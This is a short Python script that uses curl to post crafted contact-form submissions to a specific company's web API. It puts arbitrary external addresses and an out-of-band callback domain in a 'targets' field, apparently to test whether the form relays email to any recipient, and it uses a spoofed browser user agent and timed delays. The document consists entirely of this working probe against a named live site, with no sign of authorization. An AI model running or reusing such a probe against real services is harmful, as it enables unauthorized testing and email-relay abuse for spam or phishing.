import subprocess, time, json
H = "https://www.infinitycapital.bh/api/send"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
cases = [
    ("company",        "info@infinitycapital.bh"),
    ("gmail external", "ictest9@gmail.com"),
    ("random external","ictest9@protonmail.com"),
    ("oob domain",     "a@oobrelay1.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"),
]
for label, addr in cases:
    time.sleep(35)
    out = subprocess.run(["curl","-s","-A",UA,"-X","POST",H,"--max-time","25",
        "-F","fname=A","-F","lname=B","-F","areacode=973","-F","tel=3000000","-F","cname=A",
        "-F","subject=ICRELAY9","-F","msg=probe","-F","check=true","-F","targets="+addr],
        capture_output=True, text=True).stdout.strip()
    print(f"{label:18} {addr[:60]:62} -> {out[:200]}")
